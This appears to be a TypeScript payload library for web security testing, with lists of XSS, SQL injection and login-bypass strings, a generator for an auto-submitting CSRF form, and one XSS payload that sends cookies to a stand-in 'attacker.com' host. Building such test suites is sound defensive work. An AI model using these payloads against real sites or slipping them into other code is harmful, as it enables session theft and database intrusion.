/**
 * SecurityPayloads - Collection of security testing payloads
 * 
 * ⚠️ IMPORTANT: Use only on applications you own or have explicit permission to test!
 */

export class XSSPayloads {
  /**
   * Get all XSS payloads
   */
  static getAllPayloads(): string[] {
    return [
      // Basic XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      
      // Encoded XSS
      "%3Cscript%3Ealert('XSS')%3C/script%3E",
      "&lt;script&gt;alert('XSS')&lt;/script&gt;",
      
      // Event handlers
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      
      // JavaScript protocol
      "javascript:alert('XSS')",
      
      // Cookie theft (for educational purposes)
      "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
    ];
  }

  /**
   * Get basic XSS payloads
   */
  static getBasicPayloads(): string[] {
    return [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
    ];
  }

  /**
   * Get encoded XSS payloads
   */
  static getEncodedPayloads(): string[] {
    return [
      "%3Cscript%3Ealert('XSS')%3C/script%3E",
      "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    ];
  }
}

export class SQLInjectionPayloads {
  /**
   * Get all SQL injection payloads
   */
  static getAllPayloads(): string[] {
    return [
      // Basic SQL injection
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      
      // Union-based
      "' UNION SELECT NULL--",
      "' UNION SELECT 1,2,3--",
      
      // Time-based
      "'; SELECT SLEEP(5)--",
      "'; WAITFOR DELAY '00:00:05'--",
      
      // Error-based
      "' AND 1=CONVERT(int, (SELECT @@version))--",
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    ];
  }

  /**
   * Get basic SQL injection payloads
   */
  static getBasicPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "admin' --",
    ];
  }

  /**
   * Get time-based SQL injection payloads
   */
  static getTimeBasedPayloads(): string[] {
    return [
      "'; SELECT SLEEP(5)--",
      "'; WAITFOR DELAY '00:00:05'--",
    ];
  }
}

export class CSRFPayloads {
  /**
   * Generate CSRF attack form HTML
   */
  static generateCSRFForm(actionUrl: string, method: string = 'POST'): string {
    return `
      <html>
        <body>
          <form id="csrf-form" action="${actionUrl}" method="${method}">
            <input type="hidden" name="username" value="attacker">
            <input type="hidden" name="password" value="stolen">
          </form>
          <script>document.getElementById('csrf-form').submit();</script>
        </body>
      </html>
    `;
  }
}

export class AuthenticationBypassPayloads {
  /**
   * Get authentication bypass payloads
   */
  static getAllPayloads(): string[] {
    return [
      "admin",
      "admin'--",
      "admin'#",
      "' OR 1=1--",
      "' OR '1'='1",
      "admin' OR '1'='1",
    ];
  }
}
